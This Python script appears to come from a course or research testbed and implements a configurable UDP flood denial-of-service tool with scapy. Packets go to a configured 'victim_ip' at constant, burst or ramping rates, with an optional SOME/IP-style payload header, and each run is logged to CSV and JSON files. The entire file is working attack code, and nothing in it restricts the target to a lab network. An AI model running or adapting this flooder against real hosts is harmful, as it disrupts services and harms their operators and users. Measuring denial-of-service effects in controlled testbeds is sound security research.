#!/usr/bin/env python3
"""Configurable UDP flood with selectable traffic profiles and structured logging.

Modes: constant | burst | ramp. All settings come from ``src/config.yaml``.
Outputs per run under ``<logging.output_dir>/<run_id>/``:
  - manifest.json     run metadata and config snapshot
  - attacker_rate.csv periodic (t_mono_s, sent, bytes_sent, achieved_pps)
  - summary.json      totals and exit reason
"""

import csv
import json
import os
import signal
import socket
import subprocess
import sys
import time
import uuid
from datetime import datetime, timezone
from pathlib import Path

import yaml
from scapy.all import IP, UDP, Raw, send


_DEFAULT_CONFIG_PATH = Path(__file__).parent / "config.yaml"
CONFIG_PATH = Path(os.environ.get("EE122_CONFIG", str(_DEFAULT_CONFIG_PATH)))
VALID_MODES = ("constant", "burst", "ramp")


def die(msg):
    print(f"[attacker] config error: {msg}", file=sys.stderr)
    sys.exit(2)


def validate_config(cfg):
    if not isinstance(cfg, dict):
        die("config.yaml did not parse as a mapping")
    for section in ("network", "attack"):
        if section not in cfg:
            die(f"missing top-level section: {section}")

    net = cfg["network"]
    atk = cfg["attack"]
    log = cfg.setdefault("logging", {})

    if not isinstance(net.get("victim_ip"), str):
        die("network.victim_ip must be a string")

    mode = atk.get("mode", "constant")
    if mode not in VALID_MODES:
        die(f"attack.mode must be one of {VALID_MODES}, got {mode!r}")

    for key in ("target_port", "source_port", "duration", "payload_size"):
        if key not in atk:
            die(f"attack.{key} is required")
    if atk["duration"] <= 0:
        die("attack.duration must be > 0")
    if atk["payload_size"] < 0:
        die("attack.payload_size must be >= 0")
    if not (0 < atk["target_port"] < 65536):
        die("attack.target_port out of range")

    if mode == "constant":
        if atk.get("target_pps", 0) <= 0:
            die("mode=constant requires attack.target_pps > 0")
    elif mode == "burst":
        b = atk.get("burst") or {}
        for k in ("on_ms", "off_ms", "pps"):
            if b.get(k, 0) <= 0:
                die(f"mode=burst requires attack.burst.{k} > 0")
    elif mode == "ramp":
        r = atk.get("ramp") or {}
        for k in ("from_pps", "to_pps"):
            if r.get(k, 0) <= 0:
                die(f"mode=ramp requires attack.ramp.{k} > 0")

    log.setdefault("output_dir", "logs")
    log.setdefault("sample_interval_ms", 100)
    log.setdefault("run_id", None)
    if log["sample_interval_ms"] <= 0:
        die("logging.sample_interval_ms must be > 0")

    return cfg


def make_run_id(cfg):
    rid = cfg["logging"].get("run_id")
    if rid:
        return str(rid)
    ts = datetime.now(timezone.utc).strftime("%Y%m%dT%H%M%SZ")
    return f"{ts}-{uuid.uuid4().hex[:6]}"


def git_sha():
    try:
        return subprocess.check_output(
            ["git", "rev-parse", "HEAD"],
            cwd=Path(__file__).parent,
            stderr=subprocess.DEVNULL,
        ).decode().strip()
    except Exception:
        return None


def build_payload(cfg):
    size = cfg["attack"]["payload_size"]
    if cfg["attack"].get("someip_header"):
        header = b""
        header += (0x12345678).to_bytes(4, "big")   # message id
        header += max(size - 8, 0).to_bytes(4, "big")  # length
        header += (0xCAFEBABE).to_bytes(4, "big")   # request id
        header += b"\x01\x01\x02\x00"                # proto/iface/type/retcode
        pad = b"A" * max(size - len(header), 0)
        return header + pad
    return b"A" * size


def rate_for_mode(cfg, t_off):
    atk = cfg["attack"]
    mode = atk["mode"]
    if mode == "constant":
        return atk["target_pps"]
    if mode == "burst":
        b = atk["burst"]
        period_ms = b["on_ms"] + b["off_ms"]
        phase_ms = (t_off * 1000.0) % period_ms
        return b["pps"] if phase_ms < b["on_ms"] else 0.0
    if mode == "ramp":
        r = atk["ramp"]
        d = atk["duration"]
        frac = min(max(t_off / d, 0.0), 1.0)
        return r["from_pps"] + frac * (r["to_pps"] - r["from_pps"])
    return 0.0


class RateLogger:
    def __init__(self, run_dir, sample_interval_s):
        self.sample_interval_s = sample_interval_s
        self.path = run_dir / "attacker_rate.csv"
        self.fh = self.path.open("w", newline="")
        self.w = csv.writer(self.fh)
        self.w.writerow(["t_mono_s", "sent", "bytes_sent", "achieved_pps"])
        self.last_t = 0.0
        self.last_sent = 0

    def maybe_sample(self, t_off, sent, bytes_sent, force=False):
        if not force and t_off - self.last_t < self.sample_interval_s:
            return
        dt = t_off - self.last_t
        dn = sent - self.last_sent
        pps = dn / dt if dt > 0 else 0.0
        self.w.writerow([f"{t_off:.4f}", sent, bytes_sent, f"{pps:.2f}"])
        self.fh.flush()
        self.last_t = t_off
        self.last_sent = sent

    def close(self):
        self.fh.close()


def write_manifest(run_dir, run_id, cfg, t_start_wall, t_start_mono):
    manifest = {
        "run_id": run_id,
        "t_start_wall_iso": t_start_wall,
        "t_start_mono_s": t_start_mono,
        "git_sha": git_sha(),
        "host": os.uname().nodename,
        "config": cfg,
    }
    (run_dir / "attacker_manifest.json").write_text(
        json.dumps(manifest, indent=2, default=str)
    )


def write_summary(run_dir, run_id, stats):
    (run_dir / "attacker_summary.json").write_text(
        json.dumps({"run_id": run_id, **stats}, indent=2)
    )


def main():
    with open(CONFIG_PATH) as f:
        cfg = yaml.safe_load(f)
    cfg = validate_config(cfg)

    run_id = make_run_id(cfg)
    exp_log_dir = os.environ.get("EXP_LOG_DIR")
    if exp_log_dir:
        run_dir = Path(exp_log_dir)
        run_id = run_dir.name
    else:
        repo_root = Path(__file__).resolve().parent.parent
        run_dir = repo_root / cfg["logging"]["output_dir"] / run_id
    run_dir.mkdir(parents=True, exist_ok=True)

    atk = cfg["attack"]
    dst_ip = cfg["network"]["victim_ip"]
    payload = build_payload(cfg)
    pkt = IP(dst=dst_ip) / UDP(dport=atk["target_port"], sport=atk["source_port"]) / Raw(load=payload)
    pkt_total_bytes = len(payload) + 28  # IPv4 (20) + UDP (8)

    sample_interval_s = cfg["logging"]["sample_interval_ms"] / 1000.0
    logger = RateLogger(run_dir, sample_interval_s)

    exit_reason = {"value": "duration_elapsed"}

    def on_sigint(signum, frame):
        exit_reason["value"] = "sigint"
        raise KeyboardInterrupt

    signal.signal(signal.SIGINT, on_sigint)

    t_start_wall = datetime.now(timezone.utc).isoformat()
    t_start_mono = time.monotonic()
    write_manifest(run_dir, run_id, cfg, t_start_wall, t_start_mono)

    print(f"[attacker] run_id={run_id} mode={atk['mode']} target={dst_ip}:{atk['target_port']}")
    print(f"[attacker] logging to {run_dir}")

    duration = atk["duration"]
    sent = 0
    bytes_sent = 0
    next_send_mono = t_start_mono

    try:
        while True:
            now = time.monotonic()
            t_off = now - t_start_mono
            if t_off >= duration:
                break

            pps = rate_for_mode(cfg, t_off)

            if pps <= 0:
                time.sleep(min(0.01, max(0.0, duration - t_off)))
                logger.maybe_sample(t_off, sent, bytes_sent)
                next_send_mono = time.monotonic()
                continue

            interval = 1.0 / pps
            if now < next_send_mono:
                time.sleep(next_send_mono - now)

            send(pkt, verbose=False)
            sent += 1
            bytes_sent += pkt_total_bytes
            next_send_mono += interval
            # Don't let the scheduler spiral into catch-up after a slow send.
            drift_limit = time.monotonic() - 0.5
            if next_send_mono < drift_limit:
                next_send_mono = time.monotonic()

            logger.maybe_sample(t_off, sent, bytes_sent)
    except KeyboardInterrupt:
        pass
    finally:
        t_stop_mono = time.monotonic()
        elapsed = t_stop_mono - t_start_mono
        logger.maybe_sample(elapsed, sent, bytes_sent, force=True)
        logger.close()
        mean_pps = sent / elapsed if elapsed > 0 else 0.0
        write_summary(run_dir, run_id, {
            "mode": atk["mode"],
            "duration_s": elapsed,
            "sent": sent,
            "bytes_sent": bytes_sent,
            "mean_pps": mean_pps,
            "exit_reason": exit_reason["value"],
            "t_start_mono_s": t_start_mono,
            "t_stop_mono_s": t_stop_mono,
            "t_start_wall_iso": t_start_wall,
        })
        print(
            f"[attacker] sent={sent} bytes={bytes_sent} "
            f"elapsed={elapsed:.2f}s mean_pps={mean_pps:.2f} "
            f"exit={exit_reason['value']}"
        )


if __name__ == "__main__":
    main()
